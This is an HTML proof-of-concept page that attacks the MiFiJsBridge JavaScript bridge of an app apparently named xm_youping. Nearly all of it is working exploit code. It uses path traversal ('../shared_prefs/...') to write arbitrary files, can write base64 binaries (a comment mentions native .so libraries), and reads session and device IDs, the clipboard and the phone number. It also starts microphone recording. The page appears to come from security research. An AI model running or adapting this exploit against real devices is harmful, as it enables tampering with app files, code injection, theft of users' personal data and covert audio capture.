<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>xm_youping bridge poc</title>
  <style>
    body{font-family:ui-monospace,Consolas,monospace;background:#f6f7fb;color:#111;padding:12px}
    h2{margin:8px 0}
    .box{background:#fff;border:1px solid #ddd;border-radius:10px;padding:10px;margin:10px 0}
    input,textarea,button{font-family:inherit;font-size:14px}
    input,textarea{width:100%;box-sizing:border-box;padding:6px;margin:4px 0;border:1px solid #ccc;border-radius:6px}
    textarea{min-height:70px}
    button{margin:4px 4px 0 0;padding:6px 10px;border:1px solid #999;border-radius:6px;background:#fafafa}
    #log{white-space:pre-wrap;background:#111;color:#9ef;border-radius:10px;padding:10px;min-height:220px}
  </style>
</head>
<body>
  <h2>xm_youping 专用 MiFiJsBridge PoC</h2>

  <div class="box">
    <b>Storage（本包与 xmshop 不同：是 setPreference/getPreference/getAllPreferences，不是 V2）</b>
    <input id="f_name" value="../shared_prefs/secure_lib.xml" placeholder="saveFile/loadFile 的 name（可含 ../）" />
    <input id="f_auth" value="*" placeholder="authorities，逗号分隔，默认 *" />
    <textarea id="f_text"><map><int name='version' value='3'/></map></textarea>
    <textarea id="f_b64" placeholder="二进制Base64（写so时用）"></textarea>

    <button onclick="lookupStorage()">lookup(Storage)</button>
    <button onclick="saveText()">saveFile(文本)</button>
    <button onclick="saveB64()">saveFile(Base64)</button>
    <button onclick="loadFile()">loadFile</button>

    <input id="p_key" value="demo_key" placeholder="preference key" />
    <input id="p_val" value="demo_val" placeholder="preference value" />
    <button onclick="setPref()">setPreference</button>
    <button onclick="getPref()">getPreference</button>
    <button onclick="getAllPref()">getAllPreferences</button>
  </div>

  <div class="box">
    <b>Data</b><br/>
    <button onclick="getData('getDeviceId')">getDeviceId</button>
    <button onclick="getData('getSessionId')">getSessionId</button>
    <button onclick="getData('getDeviceInfo')">getDeviceInfo</button>
  </div>

  <div class="box">
    <b>Clipboard</b>
    <input id="clip_txt" value="poc_clipboard_text" />
    <button onclick="readClip()">readClipboard</button>
    <button onclick="writeClip()">writeClipboard</button>
  </div>

  <div class="box">
    <b>Account / Voice</b><br/>
    <button onclick="getPhone()">Account.getPhoneNumber</button>
    <button onclick="voiceStart()">Voice.startRecord</button>
    <button onclick="voiceStop()">Voice.stopRecord</button>
    <button onclick="voiceCancel()">Voice.cancelRecord</button>
  </div>

  <div id="log"></div>

<script>
(function(){
  const logEl = document.getElementById('log');
  const hasBridge = () => !!(window.MiFiJsBridge && MiFiJsBridge.invoke && MiFiJsBridge.lookup);
  const ts = () => new Date().toTimeString().slice(0,8);
  const log = (x) => {
    const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
    logEl.textContent += `[${ts()}] ${s}\n`;
    logEl.scrollTop = logEl.scrollHeight;
  };
  const parse = (ret) => { try { return JSON.parse(ret); } catch(e){ return {raw: ret}; } };

  function lookup(feature, action){
    try { return MiFiJsBridge.lookup(feature, action); }
    catch(e){ return `lookup-ex: ${e.message}`; }
  }

  function invoke(feature, action, param, cb){
    if(!hasBridge()) throw new Error('MiFiJsBridge not found');
    let p = null;
    if(param !== undefined && param !== null){
      p = (typeof param === 'string') ? param : JSON.stringify(param);
    }
    const cbName = cb || null;
    const raw = MiFiJsBridge.invoke(feature, action, p, cbName);
    return parse(raw);
  }

  function authArr(){
    const s = document.getElementById('f_auth').value.trim();
    if(!s) return ['*'];
    return s.split(',').map(v=>v.trim()).filter(Boolean);
  }

  window.lookupStorage = function(){
    log({lookup:{
      setPreference: lookup('Storage','setPreference'),
      getPreference: lookup('Storage','getPreference'),
      getAllPreferences: lookup('Storage','getAllPreferences'),
      saveFile: lookup('Storage','saveFile'),
      loadFile: lookup('Storage','loadFile')
    }});
  };

  window.saveText = function(){
    const param = {
      name: document.getElementById('f_name').value,
      format: 0,
      data: document.getElementById('f_text').value,
      authorities: authArr()
    };
    log({saveFile_text: invoke('Storage','saveFile', param)});
  };

  window.saveB64 = function(){
    const param = {
      name: document.getElementById('f_name').value,
      format: 1,
      data: document.getElementById('f_b64').value.trim(),
      authorities: authArr()
    };
    log({saveFile_b64: invoke('Storage','saveFile', param)});
  };

  window.loadFile = function(){
    const name = document.getElementById('f_name').value;
    const r = invoke('Storage','loadFile', name);
    log({loadFile: r});
    if(r && r.code === 200 && /file info not found/.test(JSON.stringify(r))){
      log('提示: 该实现先查 hybrid_storage 元数据；若未先 saveFile 同名记录，会返回 file info not found。');
    }
  };

  window.setPref = function(){
    const k = document.getElementById('p_key').value;
    const v = document.getElementById('p_val').value;
    const map = {}; map[k] = v;
    log({setPreference: invoke('Storage','setPreference', map)});
  };

  window.getPref = function(){
    log({getPreference: invoke('Storage','getPreference', document.getElementById('p_key').value)});
  };

  window.getAllPref = function(){
    log({getAllPreferences: invoke('Storage','getAllPreferences', '')});
  };

  window.getData = function(action){
    log({[action]: invoke('Data', action, null)});
  };

  window.readClip = function(){
    log({readClipboard: invoke('System','readClipboard', null)});
  };

  window.writeClip = function(){
    log({writeClipboard: invoke('System','writeClipboard', document.getElementById('clip_txt').value)});
  };

  window.getPhone = function(){
    const r = invoke('Account','getPhoneNumber', null);
    log({getPhoneNumber: r});
    if(r && r.code === 202){
      log('说明: 该App中 Account.getPhoneNumber 受签名门控（非MIUI签名返回202），不是PoC问题。');
    }
  };

  let voiceCb = null;
  window.voiceStart = function(){
    voiceCb = '__mifi_cb_voice_' + Date.now();
    window[voiceCb] = function(data){ log({voiceCallback: voiceCb, data: data}); };
    log({voiceStart: invoke('Voice','startRecord', 'xm_youping_voice', 'window.' + voiceCb)});
  };

  window.voiceStop = function(){ log({voiceStop: invoke('Voice','stopRecord', null)}); };
  window.voiceCancel = function(){ log({voiceCancel: invoke('Voice','cancelRecord', null)}); };

  log('PoC loaded');
  if(!hasBridge()) log('MiFiJsBridge NOT found: 请确认走到 JR WebFragment 且 URL 带 _debug=true');
})();
</script>
</body>
</html>
